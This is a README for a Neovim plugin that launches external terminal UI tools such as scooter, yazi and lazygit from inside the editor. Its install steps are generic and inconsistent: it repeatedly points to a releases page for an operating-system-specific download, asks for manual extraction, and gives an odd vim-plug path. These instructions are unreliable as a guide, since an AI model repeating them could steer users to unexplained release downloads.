# 🎉 nvim-external-tui - Easily Run External TUIs from Neovim

[![Download nvim-external-tui](https://img.shields.io/badge/Download-nvim--external--tui-blue.svg)](https://github.com/MirianElena/nvim-external-tui/releases)

## 🎈 Introduction

nvim-external-tui is a Neovim plugin that helps you work with external terminal user interface (TUI) tools right from your Neovim editor. This plugin allows you to launch applications like [scooter](https://github.com/thomasschafer/scooter) without leaving your editing environment. You can maintain focus on your work while using these external tools.

## 🚀 Getting Started

To start using nvim-external-tui, follow these steps:

1. **Visit the Releases Page**
   To download the latest version of nvim-external-tui, [visit this page to download](https://github.com/MirianElena/nvim-external-tui/releases).

2. **Download the Latest Release**
   On the Releases page, you will see a list of available versions. Look for the most recent release and download the file appropriate for your operating system.

3. **Install the Plugin**
   Follow the installation instructions specific for your version of Neovim. Here are common methods to install a plugin:

   - **Using Vim-Plug**
     Add the following line to your `~/.config/nvim/init.vim`:
     ```vim
     Plug 'MirianElena/nvim-external-tui'
     ```

   - **Using Packer**
     Add the following line to your configuration:
     ```lua
     use 'MirianElena/nvim-external-tui'
     ```

4. **Install Dependencies**
   Ensure you have Neovim installed. You can download it from [Neovim's Official Website](https://neovim.io). 

## 📥 Download & Install

After installation, follow these steps to ensure nvim-external-tui runs smoothly:

- **Unzip the Downloaded File**
  If you downloaded a zip or tar file, first unzip it. You can typically do this by right-clicking the file and selecting "Extract."

- **Move the Plugin Files**
  Move the extracted files to your Neovim plugin directory (usually `~/.local/share/nvim/site/pack/packer/start/` for Packer or `~/.vim/pack/plugins/start/` for Vim-Plug).

- **Configure Your Editor**
  Open your Neovim configuration file and set up any required commands to launch your desired TUIs. Refer to the [Documentation](https://github.com/MirianElena/nvim-external-tui) for specific setup instructions.

## ⚙️ Features

- **Simple API**
  Easily register external TUI tools with straightforward commands.

- **Automatic Command Creation**
  Automatically generate commands for selected TUI tools within your Neovim setup, allowing for quick access.

- **Community Integration**
  Compatible with well-supported community tools like [yazi](https://github.com/sxyazi/yazi) and [lazygit](https://github.com/jesseduffield/lazygit) for a smoother experience.

## 🌟 Using External TUIs

1. **Launching TUIs**
   After installation, you can launch any configured TUI directly from Neovim. Use the command defined in your configuration.

2. **Return to Editing**
   Once you finish using the external TUI, return to Neovim simply by closing the TUI window. Your editing session remains where you left off.

## 🛠 System Requirements

To effectively run nvim-external-tui, ensure the following:

- You have Neovim version 0.5 or later.
- Your system should be running on Unix-like OS, Windows, or MacOS.
- A terminal emulator that supports TUI applications.

## 🌐 Help & Support

If you need further assistance, consider visiting the project's [GitHub Issues](https://github.com/MirianElena/nvim-external-tui/issues) page. Here, you can report bugs, request features, or get help with installation issues.

## 🎯 Contributions

We welcome contributions! If you have ideas for improvements or features, feel free to open a pull request or submit an issue.

## 📦 Get Your Copy

To get started with nvim-external-tui today, [visit this page to download](https://github.com/MirianElena/nvim-external-tui/releases). Your coding experience will be enhanced with seamless integration of external TUIs. Enjoy coding!